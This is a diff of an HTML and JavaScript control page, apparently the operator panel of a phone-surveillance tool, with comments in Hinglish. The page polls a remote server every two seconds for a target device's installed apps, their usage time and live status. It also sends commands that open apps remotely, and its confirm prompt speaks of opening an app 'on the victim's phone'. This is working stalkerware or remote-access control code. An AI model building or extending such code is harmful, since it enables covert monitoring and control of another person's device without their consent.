@@ -3,303 +3,352 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Installed Apps | Admin Panel</title>
+    <title>Installed Apps</title>
+    
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
+
     <style>
         :root {
-            --bg-color: #050505;
-            --glass-bg: rgba(255, 255, 255, 0.05);
-            --glass-border: rgba(255, 255, 255, 0.1);
-            --text-main: #ffffff;
-            --text-muted: #a0a0a0;
-            --accent-color: #00d2ff;
-            --danger-color: #ff4757;
+            --bg-color: #0f172a;
+            --card-bg: #1e293b;
+            --text-primary: #f8fafc;
+            --text-secondary: #94a3b8;
+            --accent: #3b82f6;
         }
-
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; }
 
         body {
             background-color: var(--bg-color);
-            background-image: radial-gradient(circle at 10% 20%, rgba(0, 210, 255, 0.05) 0%, transparent 20%);
-            color: var(--text-main);
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            padding: 20px;
+            color: var(--text-primary);
+            font-family: 'Poppins', sans-serif;
+            padding-bottom: 50px;
         }
 
-        .container {
-            width: 100%;
-            max-width: 600px;
-            display: flex;
-            flex-direction: column;
-            gap: 20px;
-        }
-
-        /* HEADER */
-        .header {
-            background: var(--glass-bg);
+        /* Fixed Header */
+        .app-header {
+            background: rgba(30, 41, 59, 0.95);
             backdrop-filter: blur(10px);
-            border: 1px solid var(--glass-border);
-            padding: 15px 20px;
-            border-radius: 16px;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            box-shadow: 0 4px 30px rgba(0, 0, 0, 0.1);
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+            padding: 15px 0;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
         }
 
-        .header-left { display: flex; align-items: center; gap: 15px; }
-        .header h2 { font-size: 1.1rem; font-weight: 600; display: flex; align-items: center; gap: 10px; }
-        .header h2 i { color: var(--accent-color); }
-        
-        .back-btn {
-            text-decoration: none;
-            color: var(--text-main);
-            background: rgba(255, 255, 255, 0.1);
-            padding: 8px 12px;
-            border-radius: 8px;
-            transition: 0.3s;
+        /* Search Bar */
+        .search-container {
+            position: relative;
+            margin-top: 10px;
         }
-        .back-btn:hover { background: var(--accent-color); color: #000; }
-
-        /* REFRESH BUTTON */
-        .refresh-btn {
-            background: rgba(0, 210, 255, 0.15);
-            color: var(--accent-color);
-            border: 1px solid rgba(0, 210, 255, 0.3);
-            padding: 8px 15px;
-            border-radius: 8px;
-            cursor: pointer;
-            font-size: 0.85rem;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            transition: all 0.3s ease;
-        }
-        .refresh-btn:hover { background: var(--accent-color); color: #000; }
-        .refresh-btn:disabled { opacity: 0.6; cursor: not-allowed; filter: grayscale(1); }
-
-        /* SEARCH */
-        .search-container { position: relative; }
-        .search-box {
-            width: 100%;
-            padding: 14px 15px 14px 45px;
-            border-radius: 12px;
-            border: 1px solid var(--glass-border);
-            background: var(--glass-bg);
+        .search-input {
+            background: #334155;
+            border: none;
             color: white;
+            padding: 12px 45px;
+            border-radius: 12px;
+            width: 100%;
             font-size: 1rem;
-            outline: none;
-            transition: 0.3s;
         }
-        .search-box:focus { border-color: var(--accent-color); box-shadow: 0 0 10px rgba(0, 210, 255, 0.2); }
+        .search-input:focus {
+            background: #475569;
+            color: white;
+            outline: none;
+            box-shadow: 0 0 0 2px var(--accent);
+        }
         .search-icon {
             position: absolute;
             left: 15px;
             top: 50%;
             transform: translateY(-50%);
-            color: var(--text-muted);
+            color: var(--text-secondary);
         }
 
-        /* APP LIST */
-        .app-list { display: flex; flex-direction: column; gap: 10px; padding-bottom: 20px; }
-
+        /* App Grid */
         .app-card {
-            background: var(--glass-bg);
-            border: 1px solid var(--glass-border);
+            background: var(--card-bg);
+            border-radius: 12px;
             padding: 15px;
-            border-radius: 14px;
+            transition: transform 0.2s, background 0.2s;
+            border: 1px solid rgba(255, 255, 255, 0.05);
             display: flex;
             align-items: center;
             gap: 15px;
-            transition: transform 0.2s, background 0.2s;
+            position: relative;
         }
+
         .app-card:hover {
-            transform: translateY(-2px);
-            background: rgba(255, 255, 255, 0.08);
-            border-color: rgba(255, 255, 255, 0.2);
+            transform: translateY(-3px);
+            background: #263345;
+            border-color: var(--accent);
         }
 
-        .icon-box {
-            width: 50px;
-            height: 50px;
+        .app-icon {
+            width: 55px;
+            height: 55px;
             border-radius: 12px;
-            background: linear-gradient(135deg, #1e1e1e, #2a2a2a);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 1.5rem;
-            color: var(--accent-color);
+            object-fit: cover;
+            background: #000;
         }
 
-        .app-details { flex: 1; overflow: hidden; }
-        .app-name { font-size: 1rem; font-weight: 600; color: white; margin-bottom: 3px; }
-        .package-name { font-size: 0.75rem; color: var(--text-muted); font-family: monospace; }
-        
-        .status-badge {
+        .app-info {
+            flex-grow: 1;
+            overflow: hidden;
+        }
+
+        .app-name {
+            font-weight: 600;
+            font-size: 1.05rem;
+            margin-bottom: 2px;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        .pkg-name {
+            font-size: 0.75rem;
+            color: var(--text-secondary);
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        .usage-badge {
             font-size: 0.7rem;
-            padding: 4px 8px;
+            padding: 2px 8px;
             border-radius: 6px;
-            background: rgba(255, 255, 255, 0.1);
-            color: var(--text-muted);
+            background: rgba(59, 130, 246, 0.15);
+            color: #60a5fa;
+            display: inline-block;
+            margin-top: 4px;
+        }
+        
+        .live-dot {
+            width: 8px;
+            height: 8px;
+            background-color: #22c55e;
+            border-radius: 50%;
+            display: inline-block;
+            margin-left: 6px;
+            box-shadow: 0 0 5px #22c55e;
         }
 
-        .loading, .empty-state { text-align: center; margin-top: 50px; color: var(--text-muted); }
+        /* Buttons */
+        .btn-open {
+            background: var(--accent);
+            color: white;
+            border: none;
+            padding: 8px 15px;
+            border-radius: 8px;
+            font-size: 0.85rem;
+            transition: 0.2s;
+        }
+        .btn-open:hover {
+            background: #2563eb;
+        }
+
+        .btn-back {
+            color: var(--text-secondary);
+            font-size: 1.2rem;
+            text-decoration: none;
+            margin-right: 15px;
+        }
+        
+        .status-msg {
+            text-align: center;
+            color: var(--text-secondary);
+            margin-top: 50px;
+        }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <div class="header">
-            <div class="header-left">
-                <a href="index.html" class="back-btn"><i class="fa-solid fa-arrow-left"></i></a>
-                <div>
-                    <h2><i class="fa-brands fa-android"></i> Apps</h2>
-                    <div id="device-id-display" style="font-size: 0.75rem; color: var(--text-muted);">ID: ...</div>
+    <header class="app-header">
+        <div class="container">
+            <div class="d-flex align-items-center justify-content-between">
+                <div class="d-flex align-items-center">
+                    <a href="index.html" class="btn-back"><i class="fas fa-arrow-left"></i></a>
+                    <h5 class="m-0 fw-bold">Installed Apps</h5>
                 </div>
+                <button class="btn btn-sm btn-outline-light" onclick="manualRefresh()">
+                    <i class="fas fa-sync-alt"></i> <span id="liveText">Connecting...</span>
+                </button>
             </div>
-            <button id="refreshBtn" class="refresh-btn" onclick="requestUpdate()">
-                <i class="fa-solid fa-sync"></i> Refresh
-            </button>
-        </div>
-
-        <div class="search-container">
-            <i class="fa-solid fa-search search-icon"></i>
-            <input type="text" class="search-box" id="searchInput" placeholder="Search apps..." onkeyup="filterApps()">
-        </div>
-
-        <div id="app-list" class="app-list">
-            <div class="loading">
-                <i class="fa-solid fa-circle-notch fa-spin"></i> Loading...
+            
+            <div class="search-container">
+                <i class="fas fa-search search-icon"></i>
+                <input type="text" id="searchInput" class="search-input" placeholder="Search apps..." onkeyup="filterApps()">
             </div>
         </div>
+    </header>
+
+    <div class="container mt-3">
+        <div id="appsContainer" class="row g-3">
+            </div>
     </div>
 
     <script>
-        let currentDeviceId = null;
+        const SERVER_URL = "https://child-v9no.onrender.com";
+        const urlParams = new URLSearchParams(window.location.search);
+        // "deviceId" ya "id" dono support karega
+        const DEVICE_ID = urlParams.get('id') || urlParams.get('deviceId');
+        const storageKey = `apps_${DEVICE_ID}`;
+        let cachedApps = []; // For filtering
+        let refreshInterval;
 
         document.addEventListener("DOMContentLoaded", () => {
-            const urlParams = new URLSearchParams(window.location.search);
-            // URL se ID uthana (Ex: installed_apps.html?id=12345)
-            currentDeviceId = urlParams.get('deviceId') || urlParams.get('id');
-
-            if (!currentDeviceId) {
-                alert("❌ No Device Selected!");
+            if (!DEVICE_ID) {
+                alert("ID Missing!");
+                window.location.href = "index.html";
                 return;
             }
-
-            document.getElementById("device-id-display").innerText = "ID: " + currentDeviceId;
             
-            // Page load hote hi data fetch karo
-            fetchApps(currentDeviceId);
+            // 1. Pehle saved data dikhao
+            loadFromStorage();
+            
+            // 2. Command bhejo phone ko ki apps bhej
+            sendCommand();
+            
+            // 3. Live update shuru karo
+            startLiveUpdates();
         });
 
-        // ✅ 1. COMMAND BHEJNE KA FUNCTION (Jo server se match karta hai)
-        function requestUpdate() {
-            if (!currentDeviceId) return;
-
-            const btn = document.getElementById("refreshBtn");
-            const icon = btn.querySelector("i");
-            
-            // Button disable karo taaki user baar baar click na kare
-            btn.disabled = true;
-            icon.classList.add("fa-spin");
-            btn.innerHTML = `<i class="fa-solid fa-circle-notch fa-spin"></i> Sending...`;
-
-            // Server API call
-            fetch('/api/send-command', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    deviceId: currentDeviceId, 
-                    command: 'get_apps'  // Yeh command phone par jayega
-                })
-            })
-            .then(res => res.json())
-            .then(data => {
-                // Command chala gaya
-                btn.innerHTML = `<i class="fa-solid fa-clock"></i> Waiting...`;
-                
-                // 5 Second wait karo (Phone ke upload karne ka time)
-                setTimeout(() => {
-                    fetchApps(currentDeviceId); // List reload karo
-                    
-                    // Button wapas normal karo
-                    btn.disabled = false;
-                    btn.innerHTML = `<i class="fa-solid fa-sync"></i> Refresh`;
-                    icon.classList.remove("fa-spin");
-                }, 5000); 
-            })
-            .catch(err => {
-                console.error("Command Error:", err);
-                alert("Command Failed! Server check karo.");
-                btn.disabled = false;
-                btn.innerHTML = `<i class="fa-solid fa-sync"></i> Retry`;
-            });
+        // --- LIVE UPDATE (2 SECONDS) ---
+        function startLiveUpdates() {
+            fetchApps();
+            // Apps ka data bada hota hai isliye 2000ms (2 sec) rakha hai
+            refreshInterval = setInterval(() => { fetchApps(); }, 2000); 
         }
 
-        // ✅ 2. DATA FETCH KARNE KA FUNCTION
-        function fetchApps(deviceId) {
-            const listContainer = document.getElementById("app-list");
+        function manualRefresh() {
+            document.getElementById("liveText").innerText = "Updating...";
+            sendCommand(); // Force resend command
+            setTimeout(fetchApps, 1000);
+        }
 
-            fetch(`/api/get-data/${deviceId}/installed_apps`)
-                .then(res => res.json())
+        // --- FETCH & RENDER ---
+        function loadFromStorage() {
+            const savedData = localStorage.getItem(storageKey);
+            if (savedData) {
+                const data = JSON.parse(savedData);
+                cachedApps = data;
+                renderApps(data);
+            } else {
+                document.getElementById("appsContainer").innerHTML = `<div class="status-msg"><p>Fetching apps list...</p></div>`;
+            }
+        }
+
+        function sendCommand() {
+            fetch(`${SERVER_URL}/api/send-command`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ device_id: DEVICE_ID, command: 'apps' })
+            }).catch(e => console.log("Cmd Error", e));
+        }
+
+        function fetchApps() {
+            const timestamp = new Date().getTime();
+            fetch(`${SERVER_URL}/api/get-data/${DEVICE_ID}/apps?t=${timestamp}`)
+                .then(response => response.json())
                 .then(data => {
-                    listContainer.innerHTML = ""; // Loader hatao
-
-                    if (!data || data.length === 0) {
-                        listContainer.innerHTML = `
-                            <div class="empty-state">
-                                <i class="fa-solid fa-box-open" style="font-size:3rem; opacity:0.5; margin-bottom:10px;"></i>
-                                <p>No Apps Found.</p>
-                                <small>Press Refresh to fetch list</small>
-                            </div>`;
-                        return;
+                    document.getElementById("liveText").innerText = `LIVE`;
+                    if (data && Array.isArray(data) && data.length > 0) {
+                        // Naya data aaya toh save karo
+                        localStorage.setItem(storageKey, JSON.stringify(data));
+                        cachedApps = data;
+                        
+                        // Sirf tab render karo agar search box khali ho (nahi toh user type karte waqt list hil jayegi)
+                        if(document.getElementById('searchInput').value === "") {
+                            renderApps(data);
+                        }
                     }
-
-                    data.forEach(app => {
-                        // Data safely nikalna
-                        const name = app.appName || app.app_name || app.name || "Unknown App";
-                        const pkg = app.packageName || app.package_name || app.package || "com.unknown";
-                        const ver = app.versionName || app.version || "";
-
-                        const card = document.createElement("div");
-                        card.className = "app-card";
-                        card.innerHTML = `
-                            <div class="icon-box"><i class="fa-brands fa-android"></i></div>
-                            <div class="app-details">
-                                <div class="app-name">${name}</div>
-                                <div class="package-name">${pkg}</div>
-                            </div>
-                            ${ver ? `<div class="status-badge">v${ver}</div>` : ''}
-                        `;
-                        listContainer.appendChild(card);
-                    });
                 })
                 .catch(err => {
-                    console.error("Fetch Error:", err);
-                    listContainer.innerHTML = `<div class="empty-state"><p>Error loading data</p></div>`;
+                    document.getElementById("liveText").innerText = "Connecting...";
                 });
         }
 
-        // ✅ 3. SEARCH FILTER
-        function filterApps() {
-            const input = document.getElementById('searchInput').value.toLowerCase();
-            const cards = document.getElementsByClassName('app-card');
+        function renderApps(data) {
+            const container = document.getElementById("appsContainer");
+            if (!container) return;
 
-            for (let card of cards) {
-                const name = card.querySelector('.app-name').innerText.toLowerCase();
-                const pkg = card.querySelector('.package-name').innerText.toLowerCase();
-                if (name.includes(input) || pkg.includes(input)) {
-                    card.style.display = "flex";
-                } else {
-                    card.style.display = "none";
-                }
+            // Sort: Live apps upar, fir usage time ke hisaab se
+            data.sort((a, b) => b.usageMinutes - a.usageMinutes);
+
+            if(data.length === 0) {
+                container.innerHTML = `<div class="status-msg"><p>No apps found yet.</p></div>`;
+                return;
             }
+
+            let html = "";
+            
+            data.forEach(app => {
+                // Icon handling
+                let iconSrc = 'img/android_default.png'; // Fallback image path
+                if (app.icon && app.icon.length > 20) {
+                    iconSrc = `data:image/webp;base64,${app.icon}`;
+                }
+
+                // Usage Text
+                let usageText = "Not used today";
+                if (app.usageMinutes > 0) {
+                    const hours = Math.floor(app.usageMinutes / 60);
+                    const mins = app.usageMinutes % 60;
+                    usageText = hours > 0 ? `${hours}h ${mins}m today` : `${mins}m today`;
+                }
+
+                // Live Dot
+                let liveTag = app.isLive ? '<span class="live-dot" title="Running Now"></span>' : '';
+
+                html += `
+                    <div class="col-12 col-md-6 col-lg-4">
+                        <div class="app-card">
+                            <img src="${iconSrc}" class="app-icon" alt="App">
+                            <div class="app-info">
+                                <div class="d-flex align-items-center">
+                                    <div class="app-name">${app.appName}</div>
+                                    ${liveTag}
+                                </div>
+                                <div class="pkg-name">${app.packageName}</div>
+                                <div class="usage-badge"><i class="far fa-clock"></i> ${usageText}</div>
+                            </div>
+                            <button class="btn-open" onclick="openRemoteApp('${app.packageName}')">
+                                <i class="fas fa-play"></i>
+                            </button>
+                        </div>
+                    </div>
+                `;
+            });
+
+            container.innerHTML = html;
+        }
+
+        // --- SEARCH FUNCTION ---
+        function filterApps() {
+            const query = document.getElementById('searchInput').value.toLowerCase();
+            const filtered = cachedApps.filter(app => 
+                (app.appName && app.appName.toLowerCase().includes(query)) || 
+                (app.packageName && app.packageName.toLowerCase().includes(query))
+            );
+            renderApps(filtered);
+        }
+
+        // --- OPEN APP COMMAND ---
+        function openRemoteApp(pkg) {
+            if(!confirm("Open this app on the victim's phone?")) return;
+            
+            fetch(`${SERVER_URL}/api/send-command`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    device_id: DEVICE_ID,
+                    command: `open:${pkg}`
+                })
+            })
+            .then(() => alert("Command Sent!"))
+            .catch(() => alert("Failed to send command"));
         }
     </script>
-
 </body>
 </html>
